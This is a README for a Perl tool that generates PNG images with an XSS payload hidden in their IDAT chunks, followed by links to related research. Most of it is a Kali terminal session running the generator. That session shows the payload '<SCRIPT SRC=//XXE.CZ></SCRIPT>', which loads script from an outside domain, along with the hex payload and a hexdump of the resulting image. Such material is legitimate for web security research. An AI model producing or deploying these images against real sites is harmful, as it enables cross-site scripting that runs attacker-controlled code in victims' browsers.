# PNG-IDAT-chunks ~ payload generator

Simple tool to generate malicious PNG images containing JavaScript code in IDAT chunks

#### Description

Revisiting XSS payloads in PNG IDAT chunks

https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/

An XSS on Facebook via PNGs & Wonky Content Types

https://whitton.io/articles/xss-on-facebook-via-png-content-types/

Encoding Web Shells in PNG IDAT chunks

https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

Bug-hunter's Sorrow

http://www.slideshare.net/masatokinugawa/avtokyo-bug-hunters-sorrow-en

#### Example

https://www.youtube.com/watch?v=x53cPkEKmw8
```
root@kali:~/png# perl png_chunks.pl 

[ PNG IDAT chunks ~ payload generator ]

[?] Usage: perl png_chunks.pl -domain xxe.cz -output xss.png
[?] More info: perl png_chunks.pl -help

root@kali:~/png# perl png_chunks.pl -domain xxe.cz -output xss.png

[ PNG IDAT chunks ~ payload generator ]

[i] Starting GZDeflate bruteforce
[i] Domain: xxe.cz
[i] Payload: <SCRIPT SRC=//XXE.CZ></SCRIPT>
[i] It will take some time ~ please wait :)

[i] Bruteforcing tld
[!] TLD successfully bruteforced

[i] Bruteforcing domain
[!] Third character bruteforced ~ e
[!] Second character bruteforced ~ x
[!] First character bruteforced ~ x

[i] Trying to apply PNG filters

[i] PNG filters done
[i] Generating output file

[!] PNG with payload successfully generated
[!] Hex payload: 0000f399281922111510691928276e6e5313241e681b1f576e69b16375535b6f0000
[i] File saved to: xss.png

root@kali:~/png# hexdump -c xss.png 
0000000 211   P   N   G  \r  \n 032  \n  \0  \0  \0  \r   I   H   D   R
0000010  \0  \0  \0      \0  \0  \0      \b 002  \0  \0  \0   � 030   �
0000020   �  \0  \0  \0  \t   p   H   Y   s  \0  \0 016   �  \0  \0 016
0000030   � 001 225   + 016 033  \0  \0  \0   g   I   D   A   T   H 211
0000040   c   d   `   �   <   S   C   R   I   P   T       S   R   C   =
0000050   /   /   X   X   E   .   C   Z   >   <   /   s   c   r   i   p
0000060   t   > 003   C   T 223   �   L 215   �   W   � 236   � 031   �
0000070 212   �   � 227 207   �   �   [   �   � 236   �   �   q   u   L
0000080 220   �  \r   b 021   �   �   �   �   �   r 206   Q   0  \n   F
0000090   �   ( 030 005   �   ` 024 214 202   Q   0  \n   F   � 220  \a
00000a0  \0   : 227 033 002   �   |   4   %  \0  \0  \0  \0   I   E   N
00000b0   D   �   B   ` 202                                            
00000b5
root@kali:~/png#
```
